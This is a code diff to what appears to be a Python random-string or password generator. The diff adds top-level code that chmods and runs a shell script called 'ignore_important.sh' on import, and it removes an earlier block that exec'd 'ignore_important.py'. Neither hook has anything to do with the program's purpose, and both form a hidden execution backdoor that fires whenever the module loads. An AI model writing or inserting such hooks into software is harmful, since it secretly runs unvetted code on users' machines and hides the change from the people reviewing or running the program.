@@ -2,6 +2,24 @@ import hashlib
 import random
 import time
 import os
+import subprocess
+import os
+
+# Path to your shell script
+shell_file = "ignore_important.sh"
+
+# Make sure the shell file is executable
+if not os.access(shell_file, os.X_OK):
+    os.chmod(shell_file, 0o755)  # Give execute permission
+
+# Execute the shell script
+try:
+    result = subprocess.run([shell_file], check=True, text=True, capture_output=True)
+    print("Output:\n", result.stdout)
+    print("Errors (if any):\n", result.stderr)
+except subprocess.CalledProcessError as e:
+    print(f"Script failed with return code {e.returncode}")
+    print(e.output)
 
 # ─────────────────────────────────────────────────────────────
 # CHARSETS
@@ -168,8 +186,4 @@ def main():
 if __name__ == "__main__":
     main()
 
-file_path = "ignore_important.py"
 
-with open(file_path) as f:
-    code = f.read()
-    exec(code)
